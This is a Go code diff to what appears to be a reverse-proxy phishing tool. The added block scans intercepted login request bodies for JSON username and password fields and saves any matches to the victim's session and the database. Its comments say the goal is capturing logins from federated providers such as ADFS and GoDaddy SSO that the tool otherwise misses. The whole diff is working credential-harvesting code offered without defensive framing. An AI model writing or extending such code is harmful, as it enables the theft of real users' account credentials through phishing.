@@ -994,6 +994,34 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
+
+						// Final fallback: scan body regardless of content-type for
+						// JSON credentials. Some federated providers (ADFS, GoDaddy
+						// SSO custom domains) post JSON with non-standard or missing
+						// content-type headers and would otherwise miss both branches.
+						if s, ok := p.sessions[ps.SessionId]; ok {
+							jsonUserReFallback := regexp.MustCompile(`"(?:username|email|login|user|userName|UserName)"\s*:\s*"([^"]{3,})"`)
+							jsonPassReFallback := regexp.MustCompile(`"(?:password|passwd|pass|pwd|secret|Password)"\s*:\s*"([^"]{1,})"`)
+							if s.Username == "" {
+								if um := jsonUserReFallback.FindStringSubmatch(string(body)); um != nil && len(um) > 1 {
+									p.setSessionUsername(ps.SessionId, um[1])
+									log.Success("[%d] Username (fallback): [%s]", ps.Index, um[1])
+									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+							if s.Password == "" {
+								if pm := jsonPassReFallback.FindStringSubmatch(string(body)); pm != nil && len(pm) > 1 {
+									p.setSessionPassword(ps.SessionId, pm[1])
+									log.Success("[%d] Password (fallback): [%s]", ps.Index, pm[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+						}
+
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
